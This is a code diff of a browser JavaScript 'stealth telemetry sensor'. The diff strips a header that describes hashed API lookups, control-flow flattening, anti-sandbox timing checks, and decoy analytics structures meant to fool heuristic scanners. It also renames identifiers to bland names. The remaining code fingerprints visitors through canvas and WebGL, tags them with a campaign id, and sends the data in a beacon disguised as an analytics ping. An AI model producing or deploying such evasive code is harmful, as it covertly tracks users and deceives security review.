@@ -1,23 +1,10 @@
 'use strict';
-/**
- * Stealth telemetry sensor PoC (internal/track).
- *
- * Architecture:
- * - Stringless API resolve: FNV-1a over global/prototype keys; no sensitive API string literals.
- * - Generator FSM: telemetry steps yielded in entropy-shuffled order (control-flow flattening).
- * - Anti-time-warp: CPU anchor loop vs performance.now(); safe sandbox on warp.
- * - Signature mimicry: inert GA4/FB Pixel-shaped decoy structures for heuristic scanners.
- * - Stealth hydrate: beacon disguised as analytics ping; AES-GCM DOM graft in memory (no navigation).
- *
- * Verify (no sensitive literals in bundle):
- *   go test ./internal/track/ -short -run TestTelemetryStealthPoc_noSensitiveLiterals_holdout -count=1
- */
 (() => {
   const SAFE = 0;
   const LIVE = 1;
   let mode = LIVE;
 
-  // FNV-1a 32-bit (same variant as antifraud_telemetry.js): h = (h^b) + (h^b)*0x01000193
+  // FNV-1a 32-bit (same variant as tag-ctx bundle): h = (h^b) + (h^b)*0x01000193
   function hashBytes(codes) {
     let h = 0x811c9dc5;
     for (let i = 0; i < codes.length; i += 1) {
@@ -453,7 +440,7 @@
     PACK: 5,
   };
 
-  function* telemetryFsm(ctx) {
+  function* stepGen(ctx) {
     const order = shuffledSteps(6, ctx.entropy);
     let i = 0;
     while (i < order.length) {
@@ -485,7 +472,7 @@
           yield { op: STEP.ENV, env: ctx.env };
           break;
         case STEP.PACK:
-          ctx.telemetry = {
+          ctx.pack = {
             v: 1,
             mode: LIVE,
             canvas: ctx.canvas,
@@ -496,7 +483,7 @@
             anchor_ms: anchorBaselineMs,
             ts: Date.now(),
           };
-          yield { op: STEP.PACK, telemetry: ctx.telemetry };
+          yield { op: STEP.PACK, pack: ctx.pack };
           break;
         default:
           yield { op: 255 };
@@ -506,7 +493,7 @@
 
   function runFsm() {
     const ctx = { entropy: collectEntropy() };
-    const gen = telemetryFsm(ctx);
+    const gen = stepGen(ctx);
     let last = null;
     let n = 0;
     while (n < 32) {
@@ -520,7 +507,7 @@
       }
       n += 1;
     }
-    return ctx.telemetry || enterSafeSandbox();
+    return ctx.pack || enterSafeSandbox();
   }
 
   // Hydrate endpoint disguised as analytics log pixel (no window.location).
@@ -599,15 +586,15 @@
     return true;
   }
 
-  async function stealthHydrate(telemetry) {
+  async function stealthHydrate(pack) {
     const nav = resolveGlobal(H.nav);
     const sendB = nav && resolveKey(nav, H.sendB);
-    const fp = (telemetry.canvas || '') + (telemetry.webgl || '');
+    const fp = (pack.canvas || '') + (pack.webgl || '');
     const body = JSON.stringify({
       t: 'event',
       en: 'timing_complete',
       ep: { sensor_v: 1, fp: fp.slice(0, 16) },
-      telemetry,
+      pack,
     });
     const blob = new Blob([body], { type: 'text/plain' });
     let resp = null;
@@ -646,21 +633,20 @@
     if (mode === SAFE) {
       return enterSafeSandbox();
     }
-    const telemetry = runFsm();
-    if (telemetry.decoy || telemetry.mode === SAFE) {
-      return telemetry;
+    const pack = runFsm();
+    if (pack.decoy || pack.mode === SAFE) {
+      return pack;
     }
-    telemetry.campaign_id = campaignId || '';
+    pack.campaign_id = campaignId || '';
     try {
-      const hydrated = await stealthHydrate(telemetry);
-      telemetry.hydrated = hydrated;
+      pack.hydrated = await stealthHydrate(pack);
     } catch (_e) {
-      telemetry.hydrated = false;
+      pack.hydrated = false;
     }
-    return telemetry;
+    return pack;
   }
 
-  Object.defineProperty(globalThis, 'aedSensBootstrap', {
+  Object.defineProperty(globalThis, 'tagLiteBoot', {
     value: bootstrap,
     writable: false,
     configurable: false,
